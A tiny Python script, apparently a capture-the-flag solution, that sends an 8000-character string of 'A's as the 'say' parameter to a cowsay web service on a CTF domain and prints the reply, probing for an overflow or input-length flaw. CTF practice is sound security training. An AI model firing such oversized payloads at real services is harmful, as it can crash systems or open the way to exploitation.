import requests

payload = 'A'*8000
url = 'https://cowsay.unitedctf.ca/?say={}'.format(payload)

resp = requests.get(url)
print(resp.text)